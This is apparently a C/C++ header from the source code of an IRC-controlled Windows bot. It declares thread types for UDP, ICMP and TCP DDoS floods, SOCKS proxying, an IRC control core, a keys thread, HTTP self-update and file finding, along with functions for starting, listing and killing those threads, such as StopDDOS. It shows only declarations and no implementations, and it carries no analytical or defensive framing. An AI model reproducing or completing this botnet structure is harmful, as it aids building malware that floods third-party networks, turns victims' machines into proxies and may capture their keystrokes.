
enum { UNKNOWN_THREAD = 0x00, DDOS_UDP_THREAD, SOCKS_SERVER_THREAD, SOCKS_CLIENT_THREAD,
	DDOS_ICMP_THREAD, DDOS_TCP_THREAD, IRC_CORE_THREAD, KEYS_THREAD, SYSTEM_THREAD, IDENTD_THREAD,
	HTTP_GET_THREAD, HTTP_UPDATE_THREAD, MSG_BOX_THREAD, DCC_SEND_THREAD, HTTP_SERVER_THREAD, UPDATE_MONITORING_THREAD,
	FINDFILE_THREAD, UDP_SENDFILE_THREAD, UDP_SENDMSG_THREAD, BSCS_CONTROL, BSCS_CLIENT };

#define MAX_THREADS 512

typedef struct THREAD
{
	BYTE type;
	HANDLE handle;
	LPTHREAD_START_ROUTINE routine;
	LPVOID param;
	DWORD id;
	BOOL inform;
	unsigned int starttime;
	THREAD *next;
} THREAD;

typedef struct FUNC_TYPES
{
	BYTE type;
	LPTHREAD_START_ROUTINE addr;
	char szDesc[50];
} FUNC_TYPES;

HANDLE xCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId , BOOL Inform = 0);
void KillThreadByNumber( DWORD num );
void KillThreadByPattern( char *pat );
void StopDDOS(void);
void DelThreadById( DWORD Id );
void DelThreadByHandle( HANDLE h );
void CheckThreads(void);
BYTE GetFunctionType( LPTHREAD_START_ROUTINE );
char *ListThreads( char * );
DWORD RegisterFunctionType( LPTHREAD_START_ROUTINE addr, char *desc, BYTE type);
char *GetFunctionDesc( LPTHREAD_START_ROUTINE addr);
BOOL IsTypeRunning( BYTE type );
void StopUDP(void);